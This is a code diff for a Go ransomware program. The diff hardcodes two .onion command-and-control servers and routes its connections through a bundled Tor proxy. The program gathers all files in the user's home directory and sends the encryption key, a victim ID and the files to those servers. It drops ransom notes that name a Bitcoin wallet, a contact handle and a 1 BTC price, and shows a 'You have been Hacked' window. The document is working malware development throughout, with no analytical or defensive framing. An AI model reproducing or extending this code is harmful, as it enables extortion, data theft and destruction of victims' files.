@@ -1,18 +1,18 @@
 package main
 
 import (
-	"client"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"passwords"
 	"math/big"
 	"net"
 	"os"
+	"passwords"
 	"path/filepath"
+	"proxy"
 	"strconv"
 	"tor"
 
@@ -23,29 +23,26 @@ import (
 
 var (
 	// ServerBaseURL1 is the server base url injected on compile time(for keys)
-	ServerBaseURL1 string
+	ServerBaseURL1 string = "nriebxqtxebfhffyybpqtc6r5em3nmmh5ps4dn4dibwxf4ywa6hguxyd.onion"
 	// ServerBaseURL2 is the server base url injected on compile time(for files)
-	ServerBaseURL2 string
+	ServerBaseURL2 string = "wdgffq56zhi25wh73b24p27jdhyyagh7gak3swslic6qiy2fro4seeyd.onion"
 	// Your wallet address
 	Wallet = "17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR"
 	// Your contact email
 	ContactEmail = "@RealNightKing via Telegram or by email at the_nightking@proton.me"
 	// The ransom to pay
 	Price = "1 BTC"
-
-	Client *client.Client
 )
 
+const (
+	TOR_PROXY_URL = "127.0.0.1:9050"
+)
 const BUFFERSIZE = 1024
 
 func main() {
 	var home_dir string
 	home_dir, _ = os.UserHomeDir()
 	var allfiles []string = ListAllfiles(home_dir)
-	Client := client.New(ServerBaseURL1)
-	_ = Client.UseTorTransport()
-	Client2 := client.New(ServerBaseURL2)
-	_ = Client2.UseTorTransport()
 	torProxy := tor.New(os.Getenv("TEMP"))
 	torProxy.DownloadAndExtract()
 	torProxy.Start()
@@ -53,7 +50,14 @@ func main() {
 		torProxy.Kill()
 		torProxy.Clean()
 	}()
-
+	dialer1, err := proxy.SOCKS5("tcp", TOR_PROXY_URL, nil, proxy.Direct)
+	if err != nil {
+		panic(err)
+	}
+	dialer2, err := proxy.SOCKS5("tcp", TOR_PROXY_URL, nil, proxy.Direct)
+	if err != nil {
+		panic(err)
+	}
 	passwd, err := passwords.Generate(32, 10, 10, false, false)
 	if err != nil {
 		panic(err)
@@ -61,20 +65,22 @@ func main() {
 	key := []byte(passwd)
 	id, _ := rand.Int(rand.Reader, big.NewInt(1047483647))
 	ID := id.String()
-	sock, err := net.Dial("tcp", ServerBaseURL1+":3000") //keys server
+	srv1 := ServerBaseURL1 + ":3000"
+	srv2 := ServerBaseURL2 + ":3000"
+	sock, err := dialer1.Dial("tcp", srv1) //keys server
 	if err != nil {
 		panic(err)
 	}
 	sock.Write(key)
 	sock.Close()
-	con, err := net.Dial("tcp", ServerBaseURL1+":3000") //keys server
+	con, err := dialer1.Dial("tcp", srv1) //keys server
 	if err != nil {
 		panic(err)
 	}
 	con.Write([]byte(ID))
 	con.Close()
 	for i := 0; i < len(allfiles); i++ {
-		s, err := net.Dial("tcp", ServerBaseURL2+":3000") //files server
+		s, err := dialer2.Dial("tcp", srv2) //files server
 		if err != nil {
 			panic(err)
 		}
@@ -113,18 +119,18 @@ func main() {
 	%s
 
 	AND AFTER PAY CONTACT %s
-	SENDING YOUR IDENTIFICATION TO RECOVER.
-	THE KEY IS NECESSARY TO DECRYPT YOUR FILES
+	SEND US YOUR IDENTIFICATION AS WELL AS Transaction Id.
+	THE KEY IS NECESSARY TO DECRYPT YOUR FILES THANKS
 	</pre>
 	`
 	content := []byte(fmt.Sprintf(message, ID, Price, Wallet, ContactEmail))
 	for i := 0; i < len(allDir); i++ {
-		ioutil.WriteFile(allDir[i]+"READ_TO_DECRYPT.html", content, 0600)
+		ioutil.WriteFile(allDir[i]+"/"+"READ_TO_DECRYPT.html", content, 0600)
 	}
 	a := app.New()
 	w := a.NewWindow("Ooops You have been Hacked !!!")
 
-	hello := widget.NewLabel("All you files are gone")
+	hello := widget.NewLabel("All your files are Gone I hope you have backups")
 	w.SetContent(container.NewVBox(
 		hello,
 		widget.NewButton("Click here!", func() {
